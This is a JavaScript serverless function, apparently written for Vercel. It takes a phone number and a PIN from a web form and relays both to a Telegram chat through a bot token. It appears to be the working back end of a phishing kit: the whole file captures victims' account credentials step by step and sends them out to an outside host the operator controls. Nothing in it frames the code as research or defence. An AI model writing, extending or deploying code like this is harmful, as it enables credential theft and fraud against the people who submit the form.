import fetch from 'node-fetch';

// Configuration (Environment Variables)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Data storage for phone and PIN tracking (indexed by unique IDs)
const clientData = {};

// Helper function to send a message to Telegram
async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorMessage = await response.text();
      console.error("Telegram API error:", errorMessage);
    }
  } catch (err) {
    console.error("Failed to send message to Telegram:", err);
  }
}

// Vercel API Function (Serverless Function)
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const { phoneNumber, pinCode, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Missing session identifier." });
  }

  try {
    // Handle phone number submission
    if (phoneNumber && !pinCode) {
      if (clientData[sessionId] && clientData[sessionId].state === 'waiting') {
        return res.status(400).json({ error: "Phone number already submitted." });
      }

      clientData[sessionId] = { phoneNumber, pin: null, state: 'waiting' };
      console.log(`Received phone number: ${phoneNumber}`);
      await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);
      return res.status(200).json({ status: "Phone number received. Waiting for PIN." });
    }

    // Handle PIN code submission
    if (pinCode && !phoneNumber) {
      const sessionData = clientData[sessionId];
      if (!sessionData || sessionData.state !== 'waiting' || sessionData.pin !== null) {
        return res.status(400).json({ error: "No phone number waiting for a PIN." });
      }

      sessionData.pin = pinCode;
      sessionData.state = 'completed';
      console.log(`Received PIN: ${pinCode} for phone number: ${sessionData.phoneNumber}`);
      await sendTelegramMessage(`New Client Submission:\nPhone Number: ${sessionData.phoneNumber}\nPIN Code: ${pinCode}`);
      return res.status(200).json({ status: "PIN code received and sent to Telegram." });
    }

    return res.status(400).json({ error: "Invalid data. Expected either phoneNumber or pinCode." });
  } catch (error) {
    console.error("Error handling POST request:", error);
    return res.status(500).json({ error: "Internal server error." });
  }
}
